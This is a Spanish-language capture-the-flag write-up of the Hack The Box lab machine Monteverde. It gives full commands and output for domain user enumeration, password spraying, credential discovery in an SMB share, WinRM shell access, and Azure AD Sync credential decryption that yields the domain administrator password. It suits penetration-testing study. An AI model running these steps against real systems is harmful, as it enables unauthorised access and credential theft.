---
layout: post
title:  "Maquina Retirada Monteverde AD de Hack The Box (Necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada MonteVerde AD
tags: HTB, LDAP, RPCCLIENT, ASREPRoast Attack, Crackmapexec, Azure Admins Group, Privesc Azure Admins, Evil-WinRm, Maquinas Retiradas
---

# Cascade - AD Path ~ Hack The Box

Realizamos el Primer escaneo con Nmap
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-28 14:24:27Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
61610/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-04-28T14:25:17
|_  start_date: N/A
|_clock-skew: 5m45s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

Procedemos a enumerar el puerto 389 o servicio de Ldap

```bash
# ldapsearch -x -h 10.10.10.172 -b 'DC=MEGABANK,DC=LOCAL'   → para enumerar users
# ldapsearch -x -h 10.10.10.172 -b 'DC=MEGABANK,DC=LOCAL' | grep "userPrincipalName" | awk '{print $2}' | tr '@' ' ' | awk '{print $1}' 
 
mhope
SABatchJobs                                                 
svc-ata                                
svc-bexec                              
svc-netapp                                                                                               
dgalanos                               
roleary                                
smorgan 
```

Procedemos a usar la herramienta RPCCLIENT para seguir enumerando
```bash
# rpcclient -U '' 10.10.10.172 -N 

rpcclient $> "enumdomusers "                                                                                                                                           
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]                 
user:[mhope] rid:[0x641]               
user:[SABatchJobs] rid:[0xa2a]            
user:[svc-ata] rid:[0xa2b]             
user:[svc-bexec] rid:[0xa2c]                   
user:[svc-netapp] rid:[0xa2d]                                        
user:[dgalanos] rid:[0xa35]            
user:[roleary] rid:[0xa36]                    
user:[smorgan] rid:[0xa37]    
                                                                                                                                                                                     
rpcclient $>" enumdomgroups "                                
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]       
group:[Domain Guests] rid:[0x202]                         
group:[Domain Computers] rid:0x203]                                                                                                                                  
group:[Group Policy Creator Owners] rid:[0x208]                                           
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]                                                                                                                  
group:[Azure Admins] rid:[0xa29]                                                                                         
group:[File Server Admins] rid:[0xa2e]                                                          
group:[Call Recording Admins] rid:[0xa2f]                        
group:[Reception] rid:[0xa30]          
group:[Operations] rid:[0xa31]                                     
group:[Trading] rid:[0xa32]                 
group:[HelpDesk] rid:[0xa33]                  
group:[Developers] rid:[0xa34]  

Listamos usuarios para el grupo de Azure Admins:
rpcclient $>" querygroupmem 0xa29 "      
         rid:[0x1f4] attr:[0x7]                  
        rid:[0x450] attr:[0x7]                 
        rid:[0x641] attr:[0x7]
        
```

Enumeramos que usuarios pertenecen al grupo Azure Admins ( el Grupo Mas Interesante ):
```bash
rpcclient $> queryuser 0x1f4                                                                                                                                                                               [9/1813]
result was NT_STATUS_ACCESS_DENIED     
                                                                                                                                                                            
rpcclient $> "queryuser 0x450   "     
        User Name   :   AAD_987d7f2f57d2       
        Full Name   :   AAD_987d7f2f57d2       
        Home Drive  :                          
        Dir Drive   :                          
        Profile Path:                         
        Logon Script:
        Description :   Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      jue, 28 abr 2022 16:15:33 CEST
        Logoff Time              :      jue, 01 ene 1970 01:00:00 CET
        Kickoff Time             :      jue, 01 ene 1970 01:00:00 CET
        Password last set Time   :      jue, 02 ene 2020 23:53:25 CET
        Password can change Time :      vie, 03 ene 2020 23:53:25 CET
        Password must change Time:      jue, 14 sep 30828 04:48:05 CEST
        unknown_2[0..31]...
        user_rid :      0x450
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x0000000a
        padding1[0..7]...
        logon_hrs[0..21]...

rpcclient $> "queryuser 0x641"
        User Name   :  " mhope"
        Full Name   :   Mike Hope
        Home Drive  :   \\monteverde\users$\mhope
        Dir Drive   :   H:
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      vie, 03 ene 2020 14:29:59 CET
        Logoff Time              :      jue, 01 ene 1970 01:00:00 CET
        Kickoff Time             :      jue, 14 sep 30828 04:48:05 CEST
        Password last set Time   :      vie, 03 ene 2020 00:40:06 CET
        Password can change Time :      sáb, 04 ene 2020 00:40:06 CET
        Password must change Time:      jue, 14 sep 30828 04:48:05 CEST
        unknown_2[0..31]...
        user_rid :      0x641
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000002
        padding1[0..7]...
        logon_hrs[0..21]...
rpcclient $> exit
```

Enumeramos mas Usuarios para nuestro diccionario de Usuarios
```bash
# rpcclient -U '' 10.10.10.172 -N -c 'enumdomusers' | grep -oP "\[.*?\]" | tr '[]' ' ' | grep -v 0x  
 Guest 
 AAD_987d7f2f57d2 
 mhope 
 SABatchJobs 
 svc-ata 
 svc-bexec 
 svc-netapp 
 dgalanos 
 roleary 
 smorgan 
 
"Los añadimos a nuestro potencial listado de usuarios de  AD ---> users.txt "
```

Procedemos a hacer una ASPREPROAST ATTACK

```bash
# GetNPUsers.py megabank.local/ -no-pass -usersfile users.txt        
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

[-] User mhope doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SABatchJobs doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-ata doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-bexec doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-netapp doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dgalanos doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User roleary doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User smorgan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User AAD_987d7f2f57d2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mhope doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SABatchJobs doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-ata doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-bexec doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-netapp doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dgalanos doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User roleary doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User smorgan doesn't have UF_DONT_REQUIRE_PREAUTH set

No funciona
```
Probamos a Realizar un ataque de Password Spray con Crackmapexec usando porque no como PASSWORDS el mismo listado de Users

```bash
# crackmapexec smb 10.10.10.172 -u users.txt -p users.txt   
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE     "  [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs    "
```

Probamos a listar recursos compartidos por SMB para este usuario
```bash
# smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs'     
[+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        azure_uploads                                           READ ONLY
        C$                                                      NO ACCESS       Default share
        E$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        users$                                                  READ ONLY
```

```bash
# smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' -r 'azure_uploads' 
[+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        azure_uploads                                           READ ONLY
        .\azure_uploads\*
        dr--r--r--                0 Fri Jan  3 13:43:36 2020    .
        dr--r--r--                0 Fri Jan  3 13:43:36 2020    ..
        
# smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' -r 'IPC$'                                                                                                                                         1 ⚙
[+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        IPC$                                                    READ ONLY
        .\IPC$\*
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    InitShutdown
        fr--r--r--                4 Sun Dec 31 23:45:16 1600    lsass
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    ntsvcs
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    scerpc
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2\CatalogChangeListener-378-0
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    epmapper
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2\CatalogChangeListener-1d4-0
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    LSM_API_service
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    eventlog
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2\CatalogChangeListener-47c-0
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    atsvc
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2\CatalogChangeListener-62c-0
        fr--r--r--                4 Sun Dec 31 23:45:16 1600    wkssvc
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2\CatalogChangeListener-26c-0
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2\CatalogChangeListener-26c-1
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    RpcProxy\49673
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    f9f9dd07a1a076b9
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    RpcProxy\593
        fr--r--r--                4 Sun Dec 31 23:45:16 1600    srvsvc
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    spoolss
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2\CatalogChangeListener-abc-0
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    netdfs
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    vgauth-service
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2\CatalogChangeListener-264-0
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    SQLLocal\MSSQLSERVER
        fr--r--r--                2 Sun Dec 31 23:45:16 1600    sql\query
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    W32TIME_ALT
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2\CatalogChangeListener-b24-0
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    CPFATP_3900_v4.0.30319
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    PSHost.132956289328053743.3900.DefaultAppDomain.miiserver
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2\CatalogChangeListener-b14-0
        
# smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' -r 'users$'                                        
[+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        users$                                                  READ ONLY
        .\users$\*
        dr--r--r--                0 Fri Jan  3 14:12:48 2020    .
        dr--r--r--                0 Fri Jan  3 14:12:48 2020    ..
        dr--r--r--                0 Fri Jan  3 14:15:23 2020    dgalanos
        dr--r--r--                0 Fri Jan  3 14:41:18 2020    mhope
        dr--r--r--                0 Fri Jan  3 14:14:56 2020    roleary
        dr--r--r--                0 Fri Jan  3 14:14:28 2020    smorgan

# smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' -r 'SYSVOL'                                             
[+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        SYSVOL                                                  READ ONLY
        .\SYSVOL\*
        dr--r--r--                0 Thu Jan  2 23:05:27 2020    .
        dr--r--r--                0 Thu Jan  2 23:05:27 2020    ..
        dr--r--r--                0 Thu Jan  2 23:05:27 2020    MEGABANK.LOCAL
        
# smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' -r 'NETLOGON'                                      
[+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        NETLOGON                                                READ ONLY
        .\NETLOGON\*
        dr--r--r--                0 Thu Jan  2 23:05:27 2020    .
        dr--r--r--                0 Thu Jan  2 23:05:27 2020    ..
        
# smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' -r 'users$/mhope'                         
[+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        users$                                                  READ ONLY
        .\users$mhope\*
        dr--r--r--                0 Fri Jan  3 14:41:18 2020    .
        dr--r--r--                0 Fri Jan  3 14:41:18 2020    ..
        fw--w--w--             1212 Fri Jan  3 15:59:24 2020    azure.xml
```

Descargamos el archivo interesante a nuestro pc
```bash
# smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' --download 'users$/mhope/azure.xml'   
[+] Starting download: users$\mhope\azure.xml (1212 bytes)                                                                                                                                                         
[+] File output to: /home/pro/Escritorio/HTB/Monteverde/nmap/10.10.10.172-users_mhope_azure.xml
```

Lo leemos
```bash
# cat mhope-azure.xml                                                                                                                                                                                        1 ⚙ 
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">                                                                                                                                   
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>    
```
Encontramos una credenciales para mhope
```bash
crackmapexec smb 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'                                                                                                                                             1 ⚙
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ 

┌──(root💀pro)-[/home/…/Escritorio/HTB/Monteverde/nmap]
└─# crackmapexec winrm 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'                                                                                                                                           1 ⚙
WINRM       10.10.10.172    5985   MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
WINRM       10.10.10.172    5985   MONTEVERDE       [*] http://10.10.10.172:5985/wsman
WINRM       10.10.10.172    5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)

# evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'                                                                                                                                          130 ⨯ 1 ⚙

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents> cd ..
*Evil-WinRM* PS C:\Users\mhope> cd Desk*
*Evil-WinRM* PS C:\Users\mhope\Desktop> dir

    Directory: C:\Users\mhope\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         1/3/2020   5:48 AM             32 "user.txt"

```

Procedemos a sacar la flag .txt

# Microsoft Azure AD Sync Privilege Escalation 

Procedemos a enumerar el sistema:

```bash
*Evil-WinRM* PS C:\Users\mhope\Desktop> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ============================================
megabank\mhope S-1-5-21-391775091-850290835-3566037492-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
"MEGABANK\Azure Admins     "                  Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Explotacion del Grupo de Azure Admins:
```bash
"Microsoft Azure AD Sync Privilege Escalation"

https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/    --> Fuente de Info   --> Comando a aplicar en la ruta en la que subimos los archivos

https://github.com/VbScrub/AdSyncDecrypt/releases  --> Github descargar el .zip y descomprimirlo

```

Nos descargamos los recursos y los descomprimimos
```bash
# ls
AdDecrypt.exe  AdDecrypt.zip  mcrypt.dll
```

Procedemos subimos los archivos a la maquina en la ruta `"C:\Windows\Temp\Prueba\ ------------ "`
Nos desplazamos a esta ruta `*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> `

Procedemos a usar el comando `"AdDecrypt.exe -FullSQL"` :

```bash
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin>" C:\Windows\Temp\Prueba\AdDecrypt.exe -FullSQL        "

======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!
"
DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL "

```
Conseguimos sacar la contraseña en texto claro del administrator
Procedemos a sacar la flag conectandonos con Evil-Winrm

```bash
# evil-winrm -i 10.10.10.172 -u administrator -p d0m@in4dminyeah! 

Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> type Desktop/root.txt
12909612d25c8xxxxxxxxxxxx
```

Maquina Rooteada y concepto sobre el Grupo Azure Admins aprendido. K0H4ck =)
